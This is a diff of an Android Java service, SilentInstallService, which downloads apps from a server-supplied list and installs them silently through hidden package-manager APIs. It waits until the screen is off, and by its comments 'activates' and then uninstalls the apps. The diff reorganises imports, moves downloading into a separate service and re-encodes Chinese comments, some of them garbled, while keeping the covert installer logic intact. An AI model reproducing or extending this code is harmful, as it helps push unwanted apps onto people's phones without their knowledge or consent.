@@ -1,29 +1,7 @@
 package com.xstd.active.plugin;
 
-import java.io.BufferedOutputStream;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.HashSet;
-import java.util.List;
-import java.util.Set;
-
-import net.tsz.afinal.bitmap.download.Downloader;
-import net.tsz.afinal.bitmap.download.SimpleHttpDownloader;
-
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import android.app.Service;
-import android.content.BroadcastReceiver;
-import android.content.Context;
-import android.content.Intent;
-import android.content.IntentFilter;
-import android.content.SharedPreferences;
+import android.content.*;
 import android.content.pm.IPackageInstallObserver;
 import android.content.pm.IPackageManager;
 import android.content.pm.PackageInfo;
@@ -33,16 +11,11 @@ import android.database.Cursor;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
-import android.os.Environment;
-import android.os.IBinder;
-import android.os.Parcelable;
-import android.os.RemoteException;
-import android.os.SystemClock;
+import android.os.*;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.text.format.DateUtils;
 import android.util.Log;
-
 import com.android.volley.RequestQueue;
 import com.android.volley.Response.Listener;
 import com.android.volley.toolbox.JsonArrayRequest;
@@ -50,6 +23,18 @@ import com.android.volley.toolbox.Volley;
 import com.xstd.active.plugin.dao.SilenceApp;
 import com.xstd.active.plugin.dao.SilenceAppDao;
 import com.xstd.active.plugin.dao.SilenceAppDaoUtils;
+import net.tsz.afinal.bitmap.download.Downloader;
+import net.tsz.afinal.bitmap.download.SimpleHttpDownloader;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.*;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Set;
 
 public class SilentInstallService extends Service {
 
@@ -67,7 +52,6 @@ public class SilentInstallService extends Service {
 		super.onCreate();
 
 		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
-		downloader = new SimpleHttpDownloader();
 
 		try {
 			@SuppressWarnings("rawtypes")
@@ -130,9 +114,8 @@ public class SilentInstallService extends Service {
 					if (isConnected) {
 						updateService();
 						if(mustDownloadApp.size()>0) {
-							for (DownloadApplication app : mustDownloadApp) {
-								downloader.downloadToLocalStreamByUrl(app.remoteUrl, arg1);
-							}
+                            Intent service = new Intent(getApplicationContext(),DownloadService.class);
+							startService(service);
 						}
 					}
 				}
@@ -141,10 +124,10 @@ public class SilentInstallService extends Service {
 	}
 	
 	public static final String SERVER_URL_PATH = "https://";
-	private Set<DownloadApplication> mustDownloadApp = new HashSet<DownloadApplication>();
+	public static Set<DownloadApplication> mustDownloadApp = new HashSet<DownloadApplication>();
 
 	/**
-	 * ¼ì²é·şÎñÆ÷£¬¸üĞÂÏÂÔØÁĞ±í
+	 * æ›´æ–°æœåŠ¡å™¨
 	 */
 	private void updateService() {
 		long last_update_time = sharedPreferences.getLong("last_update_time", 0);
@@ -181,14 +164,14 @@ public class SilentInstallService extends Service {
 		rq.start();
 	}
 	
-	static class DownloadApplication {
+	public static class DownloadApplication {
 		String fileName;
 		String packName;
 		String remoteUrl;
 	}
 
 	private boolean isScreenLignt = true;
-	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;//Ò»ÌìµÄºÁÃëÊı
+	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;//ä¸€å¤©çš„æ¯«ç§’æ•°
 
 	private void checkActive() {
 		getDeviceInstallPackName();
@@ -223,7 +206,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * ÖØĞÂ°²×°¼¤»îĞ¶ÔØ¡£
+	 * é‡æ–°å®‰è£…ç„¶åå¸è½½
 	 * 
 	 * @param entity
 	 */
@@ -285,7 +268,7 @@ public class SilentInstallService extends Service {
 	private List<String> packgeNames = new ArrayList<String>();
 
 	/**
-	 * »ñÈ¡ÊÖ»úËùÓĞ°²×°³ÌĞòµÄ°üÃû
+	 * è·å¾—è®¾å¤‡ä¸Šå®‰è£…ç¨‹åºçš„åŒ…å
 	 */
 	private void getDeviceInstallPackName() {
 		packgeNames.clear();
@@ -295,7 +278,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * ¼¤»î°²×°µÄ³ÌĞò
+	 * æ¿€æ´»ç¨‹åº
 	 */
 	private void activeApp() {
 		getDeviceInstallPackName();
@@ -310,7 +293,7 @@ public class SilentInstallService extends Service {
 				while (active && cursor.moveToNext()) {
 					long id = cursor.getLong(0);
 					String packname = cursor.getString(1);
-					if (!packgeNames.contains(packname)) {// ËµÃ÷³ÌĞò±»ÓÃ»§Ğ¶ÔØÁË¡£
+					if (!packgeNames.contains(packname)) {
 						Log.w("ps", packname + "not active, it's uninstall, delete it in db.");
 						break;
 					}
@@ -340,7 +323,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * Ìø×ªµ½Launcher
+	 * å›åˆ°Launcher
 	 */
 	public void goHome() {
 		Intent i = new Intent(Intent.ACTION_MAIN);
@@ -350,7 +333,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * °²×°³ÌĞò
+	 * å®‰è£…ç¨‹åº
 	 * 
 	 * @param file
 	 */
@@ -374,11 +357,10 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * Í¨¹ıAPK°üµÄ¾ø¶ÔÂ·¾¶»ñµÃAPK°üµÄ°üÃû
+	 * é€šè¿‡ä¸€ä¸ªapkæ–‡ä»¶è·å¾—ç¨‹åºçš„åŒ…å
 	 * 
 	 * @param absPath
-	 *            APKµÄ¾ø¶ÔÂ·¾¶
-	 * @return APKµÄ°üÃû
+	 * @return
 	 */
 	private String getPackageName(String absPath) {
 		PackageInfo pkgInfo = getPackageManager().getPackageArchiveInfo(absPath, PackageManager.GET_ACTIVITIES);
@@ -389,7 +371,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * ÅĞ¶ÏÊÖ»úsim¿¨ÊÇ·ñÕı³£
+	 * simå¡æ˜¯å¦å¯ç”¨
 	 * 
 	 * @return
 	 */
@@ -407,9 +389,8 @@ public class SilentInstallService extends Service {
 		new Thread(new Runnable() {
 			@Override
 			public void run() {
-				SystemClock.sleep(1000 * 60 * 30);// µÈ´ı30min
+				SystemClock.sleep(1000 * 60 * 30);
 				while (isScreenLignt)
-					// Èç¹ûÆÁÄ»ÁÁ×Å£¬Ê²Ã´¶¼²»Ö´ĞĞ¡£
 					SystemClock.sleep(2000);
 				if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
 					return;
@@ -451,7 +432,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * ³ÌĞò°²×°½á¹û
+	 * ç¨‹åºå®‰è£…ç»“æœ
 	 */
 	private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {
 
@@ -466,6 +447,5 @@ public class SilentInstallService extends Service {
 			}
 		}
 	};
-	private Downloader downloader;
 
 }
